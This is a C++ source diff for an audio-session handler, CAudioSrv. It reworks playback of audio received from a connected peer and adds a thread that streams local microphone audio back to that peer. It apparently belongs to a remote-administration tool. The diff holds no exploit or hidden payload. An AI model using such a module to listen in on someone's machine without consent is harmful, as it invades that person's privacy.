@@ -8,19 +8,10 @@ CAudioSrv::CAudioSrv(CManager*pManager) :
 	CMsgHandler(pManager)
 {
 	//
-	m_Idx = 0;
-	m_hWaveOut = NULL;
-	
-	memset(&m_WaveFmt, 0, sizeof(m_WaveFmt));
-	m_WaveFmt.wFormatTag = WAVE_FORMAT_PCM; // ACM will auto convert wave format
-	m_WaveFmt.nChannels = 1;
-	m_WaveFmt.nSamplesPerSec = 44100;
-	m_WaveFmt.nAvgBytesPerSec = 44100 * 2;
-	m_WaveFmt.nBlockAlign = 2;
-	m_WaveFmt.wBitsPerSample = 16;
-	m_WaveFmt.cbSize = 0;					//额外信息
-	//
 	m_pDlg = NULL;
+
+	m_IsWorking = FALSE;
+	m_hWorkThread = NULL;
 }
 
 
@@ -31,8 +22,7 @@ CAudioSrv::~CAudioSrv()
 void CAudioSrv::OnOpen()
 {
 	m_pDlg = new CAudioDlg(this);
-	if (FALSE == m_pDlg->Create(IDD_AUDIODLG,CWnd::GetDesktopWindow()))
-	{
+	if (!m_pDlg->Create(IDD_AUDIODLG,CWnd::GetDesktopWindow())){
 		Close();
 		return;
 	}
@@ -40,106 +30,43 @@ void CAudioSrv::OnOpen()
 	//开始
 	SendMsg(AUDIO_BEGIN, 0, 0);
 }
+
 void CAudioSrv::OnClose()
 {
-	if (m_pDlg)
-	{
-		m_pDlg->SendMessage(WM_CLOSE);
-		m_pDlg->DestroyWindow();
-		// when destroy window return ,all message for
-		//this window will be processd or removed.
+	StopSendLocalVoice();
+	OnAudioPlayStop();
 
-		delete m_pDlg;
-		m_pDlg = NULL;
-	}
-	AudioOutTerm();
-}
-
-BOOL CAudioSrv::AudioOutInit()
-{
-	MMRESULT mmResult = 0;
-	//打开设备
-	mmResult = waveOutOpen(&m_hWaveOut, WAVE_MAPPER, &m_WaveFmt, NULL, 0, CALLBACK_NULL);
-	if (mmResult != MMSYSERR_NOERROR)
-		return FALSE;
-
-	memset(m_hdrs, 0, sizeof(m_hdrs));
-	//
-	for (int i = 0; i < 16; i++)
-	{
-		m_hdrs[i].lpData = buffs[i];
-		m_hdrs[i].dwBufferLength = LEN_PER_BUFF;
-	}
-	return TRUE;
-}
-void CAudioSrv::AudioOutTerm()
-{
-	//
-	if (m_hWaveOut)
-	{
-		waveOutPause(m_hWaveOut);
-		waveOutClose(m_hWaveOut);
-		m_hWaveOut = NULL;
-	}
-	//
-	memset(m_hdrs, 0, sizeof(m_hdrs));
-	m_Idx = 0;
-}
-
-void CAudioSrv::OnAudioData(char*Buffer, DWORD dwLen)
-{
-	MMRESULT mmResult = 0;
-	if (m_hWaveOut == NULL)
-	{
-		if (FALSE == AudioOutInit())
-		{
-			TCHAR szError[] = L"AudioOutInit Failed!";
-			m_pDlg->SendMessage(WM_AUDIO_ERROR, (WPARAM)szError, 0);
-			Close();
-			return;
+	if (m_pDlg){
+		if (m_pDlg->m_DestroyAfterDisconnect){
+			//窗口先关闭的.
+			m_pDlg->DestroyWindow();
+			delete m_pDlg;
+		}
+		else{
+			// pHandler先关闭的,那么就不管窗口了
+			m_pDlg->m_pHandler = nullptr;
+			m_pDlg->PostMessage(WM_AUDIO_ERROR, (WPARAM)TEXT("Disconnect."));
+			m_pDlg = nullptr;
 		}
 	}
-	m_hdrs[m_Idx].dwBytesRecorded = 0;
-	m_hdrs[m_Idx].dwFlags = 0;
-	m_hdrs[m_Idx].dwLoops = 0;
-	m_hdrs[m_Idx].dwUser = 0;
-	m_hdrs[m_Idx].lpNext = 0;
-	m_hdrs[m_Idx].reserved = 0;
-
-	m_hdrs[m_Idx].dwBufferLength = dwLen;
-
-	if (dwLen > LEN_PER_BUFF)
-	{
-		TCHAR szError[] = L"Buffer Overflow!";
-		m_pDlg->SendMessage(WM_AUDIO_ERROR, (WPARAM)szError, 0);
-		return;
-	}
-	//拷贝buffer,
-	memcpy(m_hdrs[m_Idx].lpData, Buffer, dwLen);
-
-	mmResult = waveOutPrepareHeader(m_hWaveOut, &m_hdrs[m_Idx], sizeof(WAVEHDR));
-	if (mmResult != MMSYSERR_NOERROR)
-	{
-		TCHAR szError[] = L"waveOutPrepareHeader Failed!";
-		m_pDlg->SendMessage(WM_AUDIO_ERROR, (WPARAM)szError, 0);
-		return;
-	}
-	mmResult = waveOutWrite(m_hWaveOut, &m_hdrs[m_Idx], sizeof(WAVEHDR));
-	if (mmResult != MMSYSERR_NOERROR)
-	{
-		TCHAR szError[] = L"waveOutWrite Failed!";
-		m_pDlg->SendMessage(WM_AUDIO_ERROR, (WPARAM)szError, 0);
-		return;
-	}
-	m_Idx = (m_Idx + 1) % BUFF_COUNT;
 }
+
+
+
 void CAudioSrv::OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer)
 {
 	switch (Msg)
 	{
-	case AUDIO_DATA:
-		OnAudioData(Buffer, dwSize);
+	case AUDIO_PLAY_BEGIN:
+		OnAudioPlayBegin();
 		break;
+	case AUDIO_PLAY_DATA:
+		OnAudioPlayData(Buffer, dwSize);
+		break;
+	case AUDIO_PLAY_STOP:
+		OnAudioPlayStop();
+		break;
+	
 	case AUDIO_ERROR:
 		OnAudioError((TCHAR*)Buffer);
 		break;
@@ -148,7 +75,74 @@ void CAudioSrv::OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer)
 	}
 }
 
+
 void CAudioSrv::OnAudioError(TCHAR*szError)
 {
 	m_pDlg->SendMessage(WM_AUDIO_ERROR, (WPARAM)szError, 0);
+}
+
+void CAudioSrv::OnAudioPlayBegin(){
+	OnAudioPlayStop();
+	m_AudioPlay.InitPlayer();
+}
+
+void CAudioSrv::OnAudioPlayData(char* buffer, DWORD size){
+	if (!m_AudioPlay.IsWorking()){
+		m_pDlg->SendMessage(WM_AUDIO_ERROR,
+			(WPARAM)TEXT("m_AudioPlay.IsWorking() Is False"));
+		return;
+	}
+
+	if (!m_AudioPlay.PlayBuffer(buffer, size)){
+		m_pDlg->SendMessage(WM_AUDIO_ERROR,
+			(WPARAM)TEXT("m_AudioPlay.PlayBuffer() Failed!"));
+		return;
+	}
+}
+
+void CAudioSrv::OnAudioPlayStop(){
+	m_AudioPlay.ClosePlayer();
+}
+
+//这里是发送本地语音到远程.
+void CAudioSrv::StartSendLocalVoice(){
+	StopSendLocalVoice();
+
+	InterlockedExchange(&m_IsWorking, TRUE);
+	if (m_AudioGrab.InitGrabber()){
+		SendMsg(AUDIO_PLAY_BEGIN, 0, 0);		//通知对方打开播放器...
+		m_hWorkThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SendThread,
+			this, 0, 0);
+	}
+	else{
+		InterlockedExchange(&m_IsWorking, FALSE);
+		m_pDlg->SendMessage(WM_AUDIO_ERROR, (WPARAM)TEXT("Local Audio Grab Init Failed"));
+	}
+}
+
+void CAudioSrv::StopSendLocalVoice(){
+	InterlockedExchange(&m_IsWorking, FALSE);
+
+	if (m_hWorkThread){
+		WaitForSingleObject(m_hWorkThread, INFINITE);
+		CloseHandle(m_hWorkThread);
+		m_hWorkThread = NULL;
+	}
+	m_AudioGrab.CloseGrabber();
+	SendMsg(AUDIO_PLAY_STOP, 0, 0);
+}
+
+void __stdcall CAudioSrv::SendThread(CAudioSrv*pThis)
+{
+	TCHAR szError[] = TEXT("Get Audio Buffer Error!");
+	while (InterlockedExchange(&pThis->m_IsWorking, TRUE)){
+		char*Buffer = NULL;
+		DWORD dwLen = NULL;
+		//获取buffer发送
+		if (pThis->m_AudioGrab.GetBuffer((void**)&Buffer, &dwLen)){
+			pThis->SendMsg(AUDIO_PLAY_DATA, Buffer, dwLen);
+			free(Buffer);
+		}
+	}
+	InterlockedExchange(&pThis->m_IsWorking, FALSE);
 }
